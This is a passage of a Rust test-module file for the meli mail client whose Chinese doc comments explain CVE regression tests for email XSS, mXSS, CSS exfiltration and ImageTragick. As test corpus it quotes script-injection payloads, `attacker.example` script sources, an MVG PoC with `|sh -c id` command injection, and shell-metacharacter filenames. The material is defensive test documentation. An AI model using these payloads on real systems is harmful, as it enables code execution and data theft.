/// 2. 独立拷贝的 INERT_TAG_WHITELIST/INERT_ATTR_WHITELIST 逐标签扫描
///    `sanitize` 输出，并锁定 `sanitize` 为不动点
///    （`sanitize(sanitize(x)) == sanitize(x)`），排除二次解析重组。
/// 3. 嵌入上下文探测：每条语料放进裸片段、`blockquote`、表格单元格、行内
///    强调、完整文档五种上下文（各加倍），证明清洗是解析树上的结构操作、
///    与包裹上下文无关。
/// 4. 端到端：每条语料单独装进完整 RFC 822 邮件，经 `Envelope::from_bytes`
///    / `Attachment` 解析取 HTML 正文，走与 `ViewFilter::new_html` 内置路径
///    一致的 `sanitize` ＋ `render` 链；一封信带全部语料的组合文档另有一
///    测试，断言渲染文本无 `alert(`、无 script/img 标记、无 `javascript:`，
///    且良性 https/mailto 对照锚仍在——证明被拒绝的是 scheme/标签，而不是
///    链接本身。
/// 5. 外部脚本源专用锁：凡携带 `//attacker.example/x.js` 源标记的语料，
///    `sanitize`/`render` 输出都不得残留该源，也不得出现
///    `<script`/`<img`/`src=` 等可执行标签上下文（`script` 连内容与属性一并
///    删除，`img`/`iframe`/`object`/`embed` 等元素整体剥离）。
///
/// 一处如实记录的观察（`non_markup_and_schemeless_forms_stay_inert`）：规范
/// 解析会把非标签形（`< img …>`：`<` 后跟空格）与 raw-text 元素
/// （`<xmp>`/`<noscript>`）的内容转义为**字面文本**，也会把 scheme 中间插入
/// `U+0001`/`U+000B`/`U+200B`、反引号或前导 NUL 的 href 当无 scheme 相对引用
/// 保留；这些情况下 `javascript:`/`alert(` 子串仍可能作为惰性文本出现，但既
/// 非活标签也非可执行 URL（scheme 位置的控制字符在任何浏览器里同样解析
/// 失败，也通不过 `url_scheme` 的 RFC 3986 文法、不在默认可启动 scheme 集合
/// 里），meli 只把它当链接脚注文本显示。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——安全 Rust 的 ammonia
/// 解析树白名单没有单遍字符串匹配可被双尖括号欺骗，`script` 的正文与 `src`
/// 属性随元素一起删除，`img`/`iframe`/`object`/`embed` 等元素整体剥离，
/// `javascript:`/`vbscript:`/`data:` 等 scheme 被白名单与 href 复检共同拒绝，
/// html2text 只产生纯文本。
///
/// [`cve_2002_1649`]: self::cve_2002_1649
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2002-1649.rs"]
mod cve_2002_1649;
/// CVE-2016-7966（KMail ≥ 5.3.0 的 QWebEngine 纯文本查看器；CVSS v3.0 7.3；
/// NVD / CIRCL）纯文本 URL 自动链接的引号逃逸 regression（Gitea issue #111），
/// 与同批的 CVE-2016-7967/7968 共享原语但锚点不同：KMail 把纯文本邮件转成
/// HTML 再交给 QWebEngine 显示，并为 URL 自动生成 `<a href="…">`；恶意 URL
/// 里的双引号 `"` 提前闭合 `href` 属性引号，于是
/// `http://example.com/"><script>alert(1)</script>` 这类正文可把任意
/// HTML/script 注入查看器。根因是「字符串拼接属性值 + 再交给 HTML/JS 引擎
/// 解析」。
///
/// meli 等价面 mapped to 两处，且都没有 KMail 式再解析面：meli 是终端
/// 客户端，**没有「纯文本转 HTML 再交给浏览器引擎」的功能面**（正文进
/// `CellBuffer`，纯文本永不再被当 HTML 解析）——
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的
///    [`sanitize`]（ammonia 白名单：`a` 只保留 href/title，事件属性全部剥离；
///    `url_schemes` 仅 http/https/mailto；`attribute_filter` 对 href trim 后
///    复检）＋ [`render`]（html2text → 终端纯文本），调用点是
///    `meli/src/mail/view/filters.rs` 的 `HtmlFilter::Builtin`。ammonia 一次
///    解析成 DOM、过滤、再转义序列化，引号被写成 `&quot;`，无法重组活属性。
/// 2. 纯文本/链接管线：`meli/src/mail/view/types.rs` 的
///    [`ViewOptions::convert`]（`ViewOptions::URL` 用 linkify 0.11 扫描链接）
///    ＋ `meli/src/mail/view/envelope.rs` 的 [`url_scheme`] /
///    [`is_default_launchable_scheme`]（仅 http/https/mailto 免确认
///    `launch_url`，其余 scheme 弹确认框）。linkify 0.11 的 `find_url_end`
///    把 `"`/`<`/`>`/反引号/控制字符视为「can never be part of an URL」，
///    遇到即 `break`；故 `http://example.com/"><script>…` 提取出的链接值
///    精确等于 `http://example.com/`，注入尾部留在纯文本里当字面文本，且
///    链接只作为单个 argv 参数交给启动器，无 shell、无 HTML 再解析。
///
/// [`cve_2016_7966`] 以六个分层 `#[test]` 锁定：
///
/// 1. `sanitize_strips_every_quote_escape_and_event_handler`：每条 HTML 形
///    语料经 `sanitize` 后 `<a>` 只保留 href/title（外加注入的 rel）、无活
///    事件属性名、无 `<script`，且 `sanitize(sanitize(x)) == sanitize(x)`
///    不动点；独立拷贝的 INERT_TAG_WHITELIST/INERT_ATTR_WHITELIST 预言机
///    逐标签扫描。实体编码引号形的 `onmouseover`/`alert(` 是 href 值内部的
///    惰性文本（非活属性），测试把该区别固化成断言。
/// 2. `render_never_emits_live_event_attributes_or_markup`：每条语料经
///    `render` 后无 `<script`、无任何标签形构造（故不可能携带活事件属性），
///    URL 以字面文本/脚注形式出现。
/// 3. `plain_text_pipeline_extracts_only_quote_free_links`：每条纯文本形
///    语料跑真实 `ViewOptions::convert`，每个 Link 值不含 `"`/`<`/`>`；
///    issue 原样行链接值精确等于 `http://example.com/`；把链接值插值进
///    `href="{value}"` 后解析回来仍是唯一 href（引号逃逸的机械证明）；
///    注入尾部保持字面文本；危险 scheme 不被提取。
/// 4. `launch_gate_only_passes_http_https_mailto`：启动门只对
///    http/https/mailto（大小写混写）免确认，其余 scheme/Windows 盘符/裸
///    UNC/无 scheme/纯引号串一律拒绝，`url_scheme` 词法语义单独断言。
/// 5. `multipart_attack_mail_is_defanged_end_to_end`：完整 RFC 822
///    `multipart/alternative` 邮件经 `Envelope::from_bytes`/`Attachment`
///    解析，text/plain 部件走 convert 链、text/html 部件走 sanitize＋render
///    链，断言全部不变量且良性 https/mailto 锚存活。
/// 6. `combined_corpus_mail_stays_inert`：全部语料交叉拼进一封邮件的两路
///    正文再跑一遍，防组合差异化攻击。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 没有
/// 「纯文本→HTML→浏览器引擎」的再解析面，ammonia 转义序列化引号，linkify
/// 提取的链接值永不含 `"`/`<`/`>`，链接只作为单个 argv 参数交给启动器。
///
/// [`cve_2016_7966`]: self::cve_2016_7966
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`ViewOptions::convert`]: meli::mail::view::ViewOptions::convert
/// [`url_scheme`]: meli::mail::view::envelope::url_scheme
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
#[cfg(test)]
#[path = "CVE-2016-7966.rs"]
mod cve_2016_7966;
/// CVE-2016-7967（KMail ≥ 5.3.0 的 QWebEngine 查看器；CVSS v3.0 8.1；
/// NVD / CIRCL）查看器本地文件安全上下文里的 JavaScript 执行 regression
/// （Gitea issue #112），与同批的 CVE-2016-7966/7968 共享原语但锚点不同：
/// KMail 的 HTML 查看器默认启用 JavaScript，并把本地邮件正文放在本地文件
/// 安全上下文里渲染，于是正文脚本能读取 `file:///etc/passwd` 再回传到
/// 攻击者服务器；`<img onerror>`/`<iframe src=file:>`/`<svg onload>` 同样能
/// 在本地上下文里导航或加载本地文件。根因是「把不可信邮件正文交给一个默认
/// 开 JS、且具备本地文件读取能力的网页引擎」。
///
/// meli 等价面映射到两处，且都没有 QWebEngine/JS 运行时：meli 是终端
/// 客户端，**没有 DOM、没有 JS 引擎**（正文进 `CellBuffer`，纯文本永不再被
/// 当 HTML/JS 解析）——
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的
///    [`sanitize`]（ammonia 白名单：`tags` 仅 a/b/blockquote/br/code/em/
///    h1..h6/hr/i/li/ol/p/pre/strong/table/td/th/tr/ul；`a` 只保留 href/title，
///    事件属性全部剥离；`url_schemes` 仅 http/https/mailto；
///    `clean_content_tags` 默认含 `script`/`style`，连内容一起删；
///    `attribute_filter` 对 href trim 后复检）＋ [`render`]（内部先 sanitize →
///    `cap_nesting_depth` → `html2text::config::plain()`，输出终端纯文本），
///    调用点是 `meli/src/mail/view/filters.rs` 的 `HtmlFilter::Builtin`。
///    脚本元素连脚本体删除、`img`/`iframe`/`svg` 整体剥离、
///    `file:`/`javascript:`/`data:`/`vbscript:` 的 href 全部清空。
/// 2. 纯文本/链接管线：`meli/src/mail/view/types.rs` 的
///    [`ViewOptions::convert`]（`ViewOptions::URL` 用 linkify 0.11 扫描链接）
///    ＋ `meli/src/mail/view/envelope.rs` 的 [`url_scheme`] /
///    [`is_default_launchable_scheme`]：仅 http/https/mailto 免确认
///    `launch_url`，`file:` 等其余 scheme 一律弹确认框；链接值只作为单个
///    argv 参数交给启动器，无 shell、无 HTML 再解析。
///
/// [`cve_2016_7967`] 以五个分层 `#[test]` 锁定：
///
/// 1. `sanitize_removes_script_img_iframe_and_event_handlers`：公告原形的
///    `script` 连内容删除、`img`/`iframe` 整元素删除，事件属性全部剥离，
///    `file:`/`javascript:`/`data:`/`vbscript:` href 被清；每条结构形语料经
///    `sanitize` 后无活事件属性、无 `<script`，且
///    `sanitize(sanitize(x)) == sanitize(x)` 不动点；独立拷贝的
///    INERT_TAG_WHITELIST/INERT_ATTR_WHITELIST 预言机逐标签扫描。
/// 2. `render_never_emits_live_markup_or_local_context_script`：结构形语料经
///    `render` 后无 `<script`、无任何标签形构造、无 `fetch(`/`location=`/
///    `XMLHttpRequest`/`import(` 与 `file:`；纯文本形只是字面终端文本；实体
///    编码形的字面 `<script>…` 字符串被固化为「惰性文本而非活标签」。
/// 3. `plain_text_pipeline_never_defaults_local_file_scheme`：每条纯文本形
///    语料跑真实 `ViewOptions::convert`，每个 Link 值不含 `"`/`<`/`>`、href
///    插值机械不可逃逸、`file:` 链接永不 `is_default_launchable_scheme`，
///    危险 scheme 不被提取；良性 https/mailto 仍被提取并放行。
/// 4. `multipart_attack_mail_is_defanged_end_to_end`：完整 RFC 822
///    `multipart/alternative` 邮件经 `Envelope::from_bytes`/`Attachment`
///    解析，text/plain 部件走 convert 链、text/html 部件走 sanitize＋render
///    链，断言全部不变量且良性 https/mailto 锚存活。
/// 5. `combined_corpus_mail_stays_inert`：全部语料交叉拼进一封邮件的两路正文
///    再跑一遍，防组合差异化攻击。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 没有默认开 JS 的
/// 网页引擎可被塞进本地文件上下文，ammonia 把脚本/非白名单元素与危险 scheme
/// 的 href 全部清除，html2text 只产生终端纯文本，纯文本链里 `file:` 永远
/// 通不过启动门。
///
/// [`cve_2016_7967`]: self::cve_2016_7967
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`ViewOptions::convert`]: meli::mail::view::ViewOptions::convert
/// [`url_scheme`]: meli::mail::view::envelope::url_scheme
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
#[cfg(test)]
#[path = "CVE-2016-7967.rs"]
mod cve_2016_7967;
/// CVE-2016-7968（KMail ≥ 5.3.0 的 QWebEngine 查看器；CVSS v3.0 6.5；
/// NVD / CIRCL）HTML 邮件 JavaScript 执行 regression（Gitea issue #113），
/// 与同批的 CVE-2016-7966/7967 共享原语但锚点不同：KMail 的 HTML 查看器
/// 默认启用 JavaScript，并把不可信 HTML 邮件正文直接交给 QWebEngine 渲染
/// 而不做脚本清洗，于是正文里的 `<script>`、内联事件属性（`<svg onload>`、
/// `<body onload>`、`<img onerror>`）以及 `href="javascript:…"` 都在查看器里
/// 执行；`<style>@import` 与 `background:url(...)` 还能无交互触发远程资源
/// 加载/外传。根因是「把不可信邮件正文交给一个默认开 JS 的网页引擎」。
///
/// meli 等价面映射到两处，且都没有 QWebEngine/JS 运行时：meli 是终端
/// 客户端，**没有 DOM、没有 JS 引擎**（正文进 `CellBuffer`，纯文本永不再被
/// 当 HTML/JS 解析）——
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的
///    [`sanitize`]（ammonia 白名单：`tags` 仅 a/b/blockquote/br/code/em/
///    h1..h6/hr/i/li/ol/p/pre/strong/table/td/th/tr/ul；`a` 只保留 href/title，
///    事件属性全部剥离；`url_schemes` 仅 http/https/mailto；
///    `clean_content_tags` 默认含 `script`/`style`，连内容一起删；
///    `attribute_filter` 对 href trim 后经 `is_safe_url` 复检）＋ [`render`]
///    （sanitize → `cap_nesting_depth` → `html2text::config::plain()`，输出
///    终端纯文本），调用点是 `meli/src/mail/view/filters.rs` 的
///    `HtmlFilter::Builtin`。脚本/样式元素连内容删除、svg/body/img/iframe/link
///    整体剥离、`javascript:`/`vbscript:`/`data:` 的 href 全部清空。
/// 2. 纯文本/链接管线：`meli/src/mail/view/types.rs` 的
///    [`ViewOptions::convert`]（`ViewOptions::URL` 用 linkify 0.11 扫描链接）
///    ＋ `meli/src/mail/view/envelope.rs` 的 [`url_scheme`] /
///    [`is_default_launchable_scheme`]：仅 http/https/mailto 免确认
///    `launch_url`，其余 scheme 一律弹确认框；链接值只作为单个 argv 参数交给
///    启动器，无 shell、无 HTML 再解析。
///
/// [`cve_2016_7968`] 以五个分层 `#[test]` 锁定：
///
/// 1. `sanitize_removes_script_style_and_event_handlers`：公告原形六条逐一
///    断言——script/style 连内容删除、svg/body/img 整元素删除、
///    `javascript:` href 被清但文本 `x` 存活；每条结构形语料经 `sanitize`
///    后无 `<script`/`<svg`/`<style`/`@import`、无活事件属性、无危险 scheme
///    的活 href，且 `sanitize(sanitize(x)) == sanitize(x)` 不动点；独立拷贝的
///    INERT_TAG_WHITELIST/INERT_ATTR_WHITELIST 预言机逐标签扫描；良性
///    https/mailto href 原样存活。
/// 2. `render_never_emits_live_markup_or_script_execution`：每条结构形语料经
///    `render` 后不含 `alert(1)`、无 `<script`、无任何标签形构造、无活事件
///    属性、无 `@import`；纯文本形只是字面终端文本；实体编码形的字面
///    `<script>…` 字符串被固化为「惰性文本而非活标签」。
/// 3. `plain_text_pipeline_never_defaults_script_scheme`：每条纯文本形语料跑
///    真实 `ViewOptions::convert`，每个 Link 值不含 `"`/`<`/`>`、href 插值
///    机械不可逃逸、`javascript:`/`vbscript:`/`data:` 纯文本行不被提取为链接
///    且永不 `is_default_launchable_scheme`；良性 https/mailto 仍被提取并
///    放行；启动门大小写语义单独断言。
/// 4. `multipart_attack_mail_is_defanged_end_to_end`：完整 RFC 822
///    `multipart/alternative` 邮件经 `Envelope::from_bytes`/`Attachment`
///    解析，text/plain 部件走 convert 链、text/html 部件走 sanitize＋render
///    链（多宽度 40/80/120），断言全部不变量且良性 https/mailto 锚存活。
/// 5. `combined_corpus_mail_stays_inert`：全部语料交叉拼进一封邮件的两路正文
///    再跑一遍，防组合差异化攻击。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 没有默认开 JS 的
/// 网页引擎可执行正文脚本，ammonia 把脚本/样式元素连内容删除、非白名单元素
/// 整体剥离、事件属性与危险 scheme 的 href 全部清空，html2text 只产生终端
/// 纯文本，纯文本链里 `javascript:`/`vbscript:`/`data:` 永远通不过启动门。
///
/// [`cve_2016_7968`]: self::cve_2016_7968
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`ViewOptions::convert`]: meli::mail::view::ViewOptions::convert
/// [`url_scheme`]: meli::mail::view::envelope::url_scheme
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
#[cfg(test)]
#[path = "CVE-2016-7968.rs"]
mod cve_2016_7968;

/// CVE-2022-29360（RainLoop ≤ 1.6.0 webmail；CVSS v3.1 5.4；NVD / CIRCL）
/// 邮件正文 XSS regression（Gitea issue #114），调研报告表 3「网页嵌入与
/// HTML/链接渲染」批次成员：Email Viewer 渲染特制邮件时清洗不足，注入脚本
/// 在收件人会话中执行——白名单漏放事件属性（`<p onclick>`）、`data:`/
/// `javascript:` scheme 的 URL（base64 `<script>alert(1)</script>` 载荷）与
/// `form`/`input`/`marquee` 这类可交互/自动触发元素。
///
/// meli 等价面映射（终端客户端无 webmail/浏览器/JS 运行时，按 issue 要求做
/// 等价面免疫证明）：
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的
///    [`sanitize`]（ammonia 白名单）＋ [`render`]（sanitize → 嵌套上限 →
///    html2text 纯文本），调用点 `meli/src/mail/view/filters.rs` 的
///    `HtmlFilter::Builtin`。`p`/`a` 在标签白名单内但事件属性全被剥离；
///    `data:`/`javascript:`/`vbscript:` 及其大小写/零宽填充/实体编码变体
///    的 href 全部清空（base64 载荷随属性删除）；`form`/`input`/`marquee`
///    等非白名单元素整元素删除（含 `action`/`formaction`/`autofocus`/
///    `onfocus`，`isindex` 解析期模板展开产物同样死）。
/// 2. 纯文本/链接管线：`ViewOptions::convert`（linkify 0.11，`data:` 行
///    不被提取）＋ [`url_scheme`] / [`is_default_launchable_scheme`] 启动门：
///    仅 http/https/mailto 免确认，其余 scheme 一律弹用户确认框。
///
/// [`cve_2022_29360`] 以五个分层 `#[test]` 锁定（详见模块文档）：sanitize
/// 平面（公告四条黄金等值 ＋ 预言机不动点）、render 纯文本不变量（无
/// `alert(`/`PHNjcmlwdD`）、纯文本管线＋启动门、端到端邮件、组合文档。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 没有可执行正文
/// 脚本的网页渲染上下文；非白名单元素整体剥离、事件属性与危险 scheme 的
/// href 全部清空，html2text 只产生终端纯文本，纯文本链里 `data:`/
/// `javascript:` 永远通不过 [`is_default_launchable_scheme`]。
///
/// [`cve_2022_29360`]: self::cve_2022_29360
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`url_scheme`]: meli::mail::view::envelope::url_scheme
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
#[cfg(test)]
#[path = "CVE-2022-29360.rs"]
mod cve_2022_29360;

/// CVE-2024-42009（Roundcube < 1.5.8、1.6.x < 1.6.8；CVSS v3.1 9.3；
/// NVD / SonarSource）**反清洗（desanitization）mXSS** regression
/// （Gitea issue #115），调研报告表 3「网页嵌入与 HTML/链接渲染」批次成员：
/// Roundcube 的 `message_body()`（`program/actions/mail/show.php`）清洗邮件正文
/// 后，又把清洗结果交给后续处理/再解析；藏在白名单属性值里的标记串在第二次
/// 解析时因上下文切换变异成活标签，绕过清洗执行脚本并窃取/代发受害者邮件。
/// 根因是「清洗一次、再解析一次」：序列化后的清洗输出被重新喂给 HTML 解析器，
/// 两次解析的树形状不一致（mXSS）。
///
/// meli 等价面映射（终端客户端无 DOM/浏览器/JS 运行时，按 issue 要求做等价面
/// 断言）：
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的 [`sanitize`]
///    （ammonia 单次解析 → 序列化）＋ [`render`]（sanitize → 嵌套上限 →
///    html2text 纯文本），调用点 `meli/src/mail/view/filters.rs` 的
///    `HtmlFilter::Builtin`。meli 管线内**没有第二次解析**，可复现的等价物是
///    清洗输出里的标记串原料：白名单标签（p/a）的 generic 属性（title/lang）
///    或 href 可携带字面 `</style><img src=1 onerror=alert(1)>`；html5ever 把
///    `<`/`>` 序列化成 `&lt;`/`&gt;`，但解析树里的属性值仍是字面标记串，输出里
///    仍留 `onerror`/`alert(` 文本，任何「读回属性值再解析」的下游消费者都会
///    拿到活的原料。
/// 2. **本 issue 检出并修复该缺口**：生产改动给 [`sanitize`] 的
///    `attribute_filter` 增加了「保留属性值解码后含标签起始 `<` 即整属性丢弃」
///    的第三处 nh3 parity 有意偏离（`href` 在内，因带 scheme 的 URL 可把标记串
///    塞进 path/query 骗过 `is_safe_url`）。
///
/// [`cve_2024_42009`] 以五个分层 `#[test]` 锁定（详见模块文档）：sanitize 平面
/// （公告三条 ＋ 绕过全量）、独立白名单预言机＋不动点、五种嵌入上下文探测、
/// 每条语料单独成信的端到端（多宽度）＋组合邮件、缺口回归与惰性文本观测。
///
/// 结论：**检出并修复属性值标记串走私缺口，非纯免疫证明**——三条公告原形在
/// 修复前也已干净通过（noscript raw-text / math / svg 命名空间使载荷在单次解析
/// 的树里死亡），但 generic 属性与 href 的属性值可把标记串带进清洗输出，违反
/// issue 的「输出不含 `<img`/`onerror`」断言；修复后全部语料满足不变量。
///
/// [`cve_2024_42009`]: self::cve_2024_42009
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2024-42009.rs"]
mod cve_2024_42009;

/// CVE-2024-42010（Roundcube < 1.5.8、1.6.x < 1.6.8；CVSS v3.1 7.5；
/// NVD / Roundcube 安全公告）**CSS 清洗绕过信息泄露** regression
/// （Gitea issue #116），调研报告「网页嵌入与 HTML/链接渲染」批次成员：
/// Roundcube 的 `mod_css_styles` 对渲染邮件里的 CSS token 序列过滤不足，攻击者
/// 可在邮件 HTML 里夹带 CSS 指令，借 CSS 侧信道（`@import`/`url(...)` 的资源
/// 请求、属性选择器/动画的时间差）把敏感信息编码进外发请求实现外传。根因是
/// 「CSS 被当数据渲染」：清洗没有一并抽取指令原料，残留的 `@import`/`url(`/
/// `expression(` 在存在 CSS 引擎的消费者里是活指令。
///
/// meli 等价面映射（终端客户端无 CSS 引擎/浏览器/JS 运行时，按 issue 要求做
/// 等价面断言）：
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的 [`sanitize`]
///    （ammonia 白名单单次解析 → 序列化）＋ [`render`]（sanitize → 嵌套上限 →
///    html2text 纯文本），调用点 `meli/src/mail/view/filters.rs` 的
///    `HtmlFilter::Builtin`。html2text **不加载任何远程资源、不执行布局/动画**，
///    这是 CSS 侧信道的第二道防线。可复现的等价物是清洗输出里的 **CSS 指令
///    原料**：白名单标签保留的属性值（`a[title]`/`a[href]`）可原样携带
///    `@import url("…")`/`url(…)`/`expression(…)`。
/// 2. **本 issue 检出并修复该缺口**：生产改动给 [`sanitize`] 的 `attribute_filter`
///    增加了「保留属性值以 ASCII 大小写不敏感方式含 `@import`/`url(`/
///    `expression(` 即整属性丢弃」的第四处 nh3 parity 有意偏离（`href` 在内，与
///    42009 同判例：清洗输出不得携带下游再消费的活原料）。issue 原样的
///    `<style>`/`<link>`/`style=` 载体本就死在白名单，但属性值走私形会在修复前
///    把指令原料原样带进输出。
///
/// [`cve_2024_42010`] 以五个分层 `#[test]` 锁定（详见模块文档）：语料结构自检、
/// sanitize 平面＋独立白名单预言机＋不动点、五种嵌入上下文探测、每条语料单独
/// 成信的端到端（多宽度 40/80/120）＋组合邮件、缺口回归与惰性文本观测（含
/// 「可见链接对照」只作为 html2text 脚注文本出现、永不自动抓取）。
///
/// 结论：**检出并修复属性值 CSS 指令走私缺口，非纯免疫证明**——issue 原样的
/// `<style>`/`<link>`/`style=` 载体本就干净通过，但保留属性值可把 `@import`/
/// `url(`/`expression(` 原样带进清洗输出，违反 issue 的「输出不含 `@import`、
/// `url(`」断言；修复后全部语料满足不变量。纯文本形（正文散文里的字面 token）
/// 是惰性转义文本，用结构化预言机区分，不做会误报的裸子串匹配。
///
/// [`cve_2024_42010`]: self::cve_2024_42010
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2024-42010.rs"]
mod cve_2024_42010;

/// CVE-2024-45516（Zimbra Collaboration (ZCS)：8.8.15 < Patch 47、
/// 9.0.0 < Patch 43、10.0.x < 10.0.12、10.1.x < 10.1.4；CVSS v3.1 6.1；
/// CWE-79）**Zimbra Classic UI 存储型 XSS** regression（Gitea issue #117），
/// 调研报告「网页嵌入与 HTML/链接渲染」批次成员：Classic UI 对 HTML 内容清洗
/// 不足，**畸形 `<img>` 标签内嵌 JavaScript** 仍以活原料形态存进邮件，受害者
/// 只要查看这封特制邮件脚本就会在其会话里执行（无需额外交互），根因是事件
/// 处理器/危险 URL scheme 原料在清洗后仍留在渲染文档里。
///
/// meli 等价面映射（终端客户端无 DOM/浏览器/JS 运行时，按 issue 要求做等价面
/// 断言）：
///
/// 1. 内置 HTML 清理管线：`meli/src/mail/view/html_render.rs` 的 [`sanitize`]
///    （ammonia 白名单单次解析 → 序列化）＋ [`render`]（sanitize → 嵌套上限 →
///    html2text 纯文本），调用点 `meli/src/mail/view/filters.rs` 的
///    `HtmlFilter::Builtin`。html2text **不执行脚本、不解析 URL scheme**，这是
///    XSS 的第二道防线。可复现的等价物是清洗输出里的 **XSS 原料**：`img` 不在
///    标签白名单（整元素连属性删除，实体编码无法复活），但白名单标签保留的
///    属性值（`a[title]`/`a[href]`、`p[lang]`/`p[title]`）可原样携带
///    `onerror=alert(1)` / `javascript:alert(1)`。
/// 2. **本 issue 检出并修复该缺口**：生产改动给 [`sanitize`] 的
///    `attribute_filter` 增加了「保留属性值解码后含裸 `onerror` 或
///    `javascript:` 即整属性丢弃」的第五处 nh3 parity 有意偏离（`href` 在内，
///    与 42009/42010 同判例：合法 `https:` URL 可把 `javascript:alert(1)` 藏进
///    path/query 骗过 `is_safe_url`）。issue 原样的四条 `<img>` 载体本就死在
///    标签白名单，但属性值走私形会在修复前把 XSS 原料原样带进输出。
///
/// [`cve_2024_45516`] 以五个分层 `#[test]` 锁定（详见模块文档）：语料结构自检、
/// sanitize 平面＋独立白名单预言机＋不动点、五种嵌入上下文探测、每条语料单独
/// 成信的端到端（多宽度 40/80/120）＋组合邮件、缺口回归与惰性文本观测（含
/// 「可见链接对照」只作为 html2text 脚注文本出现、永不自动抓取）。
///
/// 结论：**检出并修复属性值 XSS 原料走私缺口，非纯免疫证明**——issue 原样的
/// `<img>` 载体本就干净通过，但保留属性值可把 `onerror`/`javascript:` 原样带进
/// 清洗输出，违反 issue 的「输出不含 `<img`/`onerror`/`javascript:`」断言；修复后
/// 全部语料满足不变量。纯文本形（正文散文里的字面 token）是惰性转义文本，用
/// 结构化预言机区分，不做会误报的裸子串匹配。
///
/// [`cve_2024_45516`]: self::cve_2024_45516
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2024-45516.rs"]
mod cve_2024_45516;

/// CVE-2016-3714（ImageMagick < 6.9.3-10、7.x < 7.0.1-1；CVSS v3.0 8.4
/// `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`；CWE-78「OS 命令注入」）
/// **ImageTragick 图片解码命令注入** regression（Gitea issue #118），调研报告
/// 病毒/代码执行批次成员：ImageMagick 的 EPHEMERAL/MVG/MSL 等 coder 解析特制
/// 图片时，把图片里 mail-controlled 的文本拼进一条系统命令再交给 shell 执行。
/// 公告最经典的可利用形是 MVG 的
///
/// ```text
/// push graphic-context
/// viewbox 0 0 640 480
/// fill 'url(https://attacker.example/x.png"|sh -c id;")'
/// pop graphic-context
/// ```
///
/// ——`fill 'url(...)'` 的 URL 里内嵌 `"|sh -c id;`，ImageMagick 把这段文本拼进
/// 取图命令行后 shell 执行 `sh -c id`，任意命令注入 → RCE。MSL 的
/// `<read>`/`<write>`、EPHEMERAL/label coder 的 `label:@/tmp/...` 是同一原语的
/// 其它 spelling。邮件的攻击面在于：邮件客户端对**附件图片**做隐式缩略图/预览
/// 时，自动把不可信图片喂给 ImageMagick，用户甚至不需要打开附件。
///
/// **meli 等价面映射（免疫证明）**：meli 是终端邮件客户端，**没有「对附件图片
/// 做隐式解码/缩略图/预览」这条功能面**——等价面断言如下：
///
/// 1. **依赖面**：`meli/Cargo.toml`、`melib/Cargo.toml` 与 `Cargo.lock` 的整棵
///    依赖树都没有 `image`/`imagemagick`/`magick`/`libvips`/`png`/`gif` 等图片
///    解码 crate；`meli/src`、`melib/src` 里也不存在
///    `Command::new("convert")`/`"magick"`/`"mogrify"` 之类的子进程调用点。
///    ImageTragick 的触发前提（把不可信图片交给 ImageMagick）没有代码可运行。
/// 2. **字节面**：附件字节在 meli 里自始至终是不透明数据。唯一的附件落地点
///    [`File::create_temp_file`] 把 ImageTragick PoC 逐字节写进
///    `<temp>/meli/<random>`，既不解析也不改写；melib 的解析层同样只把 PoC
///    当附件字节（`Attachment::decode` 逐字节等于原图）。
/// 3. **命令拼接面**：meli 里唯一把数据交给 `sh -c` 的通用边界是 mailcap
///    [`MailcapEntry::run`]，而图片内容从不进入命令行——只有附件**文件名**
///    会经 `%s` 变成临时路径。文件名是 mail-controlled 的，`sanitize_filename`
///    还刻意保留 `$`/反引号/`;`/`|`/`>`，所以这里才是 meli 版 ImageTragick
///    「图片元字符 → shell」的等价注入面，由 issue #57 的上下文感知 armor
///    （`shell_quote_context` + `encode_for_context`）封堵。
///
/// [`cve_2016_3714`] 以五个分层 `#[test]` 锁定（详见模块内注释）：
///
/// 1. `no_image_decoder_dependency_or_subprocess_surface`：manifest + 锁文件 +
///    全源码扫描，断言不存在任何图片解码功能面与 ImageMagick 子进程。
/// 2. `image_tragick_payloads_land_byte_faithful_and_confined`：六种 MVG/MSL/
///    EPHEMERAL PoC 经 `File::create_temp_file` 落盘逐字节保真、路径在
///    `<temp>/meli/` 下、组件 ≤ `FILENAME_COMPONENT_MAX_BYTES`/`NAME_MAX`、
///    单一平坦组件、无路径穿越、路径随机化。
/// 3. `image_tragick_bytes_round_trip_as_opaque_attachment`：PoC 作为真实 MIME
///    附件被 melib 解析后 `decode`/`raw` 仍是原字节。
/// 4. `percent_s_filename_injection_is_inert_in_every_shell_context`：八种恶意
///    附件名（`evil\`id\`.png`、`x;touch /tmp/pwned;.mvg`、含 `$()`/反引号/
